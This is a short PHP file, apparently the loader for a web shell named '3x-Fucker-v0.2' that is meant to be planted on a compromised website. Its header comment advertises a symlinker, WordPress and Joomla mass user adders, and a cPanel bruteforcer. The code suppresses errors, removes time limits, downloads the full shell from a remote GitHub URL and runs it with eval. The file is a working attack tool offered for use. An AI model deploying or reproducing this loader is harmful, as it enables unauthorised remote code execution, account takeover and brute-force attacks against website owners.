<?php
		error_reporting(0);
        ini_set("max_execution_time",0);
        /**************
        3x-Fucker-v0.2
        Date- 01-06-19
        Version- 0.2-2
        Usage-
                Wrong: 3x-fucker-v0.2.php
                Correct: 3x-fucker-v0.2.php?3x=3x
        Bugs -
                Sometime it gives 404 error page after clicking anything. Like if you clicked Symlinker then your url will look like this -> https://mytarget.com/3x-fucker.php?tool=Symlinker but you see a 404 error page. You just simply add 3x=3x& before tool=Symlinker like this -> https://mytarget.com/3x-fucker.php?3x=3x&tool=Symlinker then there will no 404 page.
        Changelogs -
                Blotewares Removed
                Wordpress Mass User Changer Replaced With Mass User Adder
                Joomla Mass User Changer Added [!NEW]
                Cpanel Bruteforcer Added [!NEW]
                Check If An Bug Fix Update Is Available [!NEW]
                Bug Fixed That Caused Destroying Website When Giving Wrong Config Path In Wordpress Mass User Changer
        Greetz- Jokr Haxor | Saiyan Haxor
        **************/
	if(!isset($_SESSION["current"])) {
		$_SESSION["current"] = true;
		$_curl = curl_init();
		curl_setopt($_curl, CURLOPT_URL, "https://raw.githubusercontent.com/3xPr1nc3/3x-fucker-v0.2/master/3x-fucker-v0.2.php");
		curl_setopt($_curl, CURLOPT_RETURNTRANSFER, true);
		$_get = curl_exec($_curl);
	}
	if(isset($_SESSION["current"])) {
		eval("?>".$_get);
	}
?>
